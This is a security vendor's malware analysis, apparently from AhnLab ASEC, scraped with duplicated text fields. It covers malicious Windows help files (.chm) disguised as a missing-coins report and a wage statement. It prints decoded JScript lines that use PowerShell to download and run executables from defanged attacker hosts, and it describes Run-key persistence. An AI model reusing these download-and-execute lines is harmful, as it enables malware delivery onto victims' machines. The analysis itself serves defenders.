title: Malicious Help File Disguised as Missing Coins Report and Wage Statement (*.chm)

chapters.title: Malicious Help File Disguised as Missing Coins Report and Wage Statement (*.chm)

sentences.text: The ASEC analysis team has discovered a continuous distribution of malware disguised as a Windows Help File (*.chm). The most recent CHM file is identical to the file introduced in <APT Attack Being Distributed as Windows Help File (*.chm)> to download the additional malware.
sentences.html: The ASEC analysis team has discovered a continuous distribution of malware disguised as a Windows Help File (*.chm). The most recent CHM file is identical to the file introduced in <APT Attack Being Distributed as Windows Help File (*.chm)> to download the additional malware.

sentences.text: It appears that the CHM file of this type is distributed in the form of a compressed file. The confirmed filenames of the compressed files and internal CHM files are as follows:
sentences.html: It appears that the CHM file of this type is distributed in the form of a compressed file. The confirmed filenames of the compressed files and internal CHM files are as follows:

sentences.text: Names of Compressed FilesNames of Internal CHM FilesMissing Coins Info.ziplost.chmData.zipDefault.chmWage Statement.rarsalary.chmTable 1. Confirmed Filenames
Missing Coins Info.zip file contains the following additional compressed file and Word file.
sentences.html: Missing Coins Info.zip file contains the following additional compressed file and Word file.

sentences.text: Figure 1. Files inside Missing Coins Info.zip
The Word file is an innocuous file that contains text related to missing coins (see Figure below).
sentences.html: The Word file is an innocuous file that contains text related to missing coins (see Figure below).

sentences.text: Figure 2. Word file
Find Missing Coins.rar contains lost.chm, and when it is run, it creates Help with content related to coins and performs malicious activities.
sentences.html: Find Missing Coins.rar contains lost.chm, and when it is run, it creates Help with content related to coins and performs malicious activities.

sentences.text: Figure 3. Inside Find Missing Coins.rar
Figure 4. Executed lost.chm

Inside the lost.chm file is the same HTML file and the internal special command introduced in the previous blog post. As such, running the CHM file results in the execution of the cmd command and the creation of Document.dat and Document.jse in the %USERPROFILE%\Links\ folder. The difference from the previous is that Document.jse is created instead of Document.vbs.
sentences.html: Inside the lost.chm file is the same HTML file and the internal special command introduced in the previous blog post. As such, running the CHM file results in the execution of the cmd command and the creation of Document.dat and Document.jse in the %USERPROFILE%\Links\ folder. The difference from the previous is that Document.jse is created instead of Document.vbs.

sentences.text: The data that exists in Document.dat is base64-decoded and saved as Document.jse. The decoded JSE data then uses powershell to download the additional file from a certain URL and runs it (see below).
sentences.html: The data that exists in Document.dat is base64-decoded and saved as Document.jse. The decoded JSE data then uses powershell to download the additional file from a certain URL and runs it (see below).
var s=new ActiveXObject("WScript.Shell"); var c="cmd /c powershell iwr -outf %tmp%\\csrss.exe hxxps://foxiebed[.]com/database/db.php?type=1 & start %tmp%\\csrss.exe"; s.run(c,0,false);

sentences.text: Afterward, it adds %USERPROFILE%\Links\Document.jse to HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to ensure that the JSE file can be continuously run.
sentences.html: Afterward, it adds %USERPROFILE%\Links\Document.jse to HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to ensure that the JSE file can be continuously run.

sentences.text: The following CHM files were found subsequently.
sentences.html: The following CHM files were found subsequently.

sentences.text: Wage Statement.rar salary.chm
sentences.html: • Wage Statement.rar – salary.chm

Data.zip Default.chm
sentences.html: • Data.zip – Default.chm

sentences.text: This file is compressed with an innocuous PDF file, in a similar fashion to the aforementioned Missing Coins Info.zip.
sentences.html: This file is compressed with an innocuous PDF file, in a similar fashion to the aforementioned Missing Coins Info.zip.

sentences.text: Figure 8. Innocuous PDF file
Figure 9. Executed Default.chm

sentences.text: (new ActiveXObject(WScript.Shell)).run(cmd /c powershell iwr -outf %tmp%\\lsass.exe hxxps://trueliebe[.]com/kettle/pot & start %tmp%\\lsass.exe Dmzei125oAl,0,false)Data of decoded Document.jse
The team could not find extra files because the access to the download URL is currently blocked, but users must stay vigilant as the attack may upload various malicious files in the future.
sentences.html: The team could not find extra files because the access to the download URL is currently blocked, but users must stay vigilant as the attack may upload various malicious files in the future.

sentences.text: AhnLabs anti-malware product, V3, detects and blocks the malware using the alias below.
sentences.html: AhnLab’s anti-malware product, V3, detects and blocks the malware using the alias below.

sentences.text: [File Detection]<crlf>Trojan/CHM.Agent
sentences.html: [File Detection] Trojan/CHM.Agent
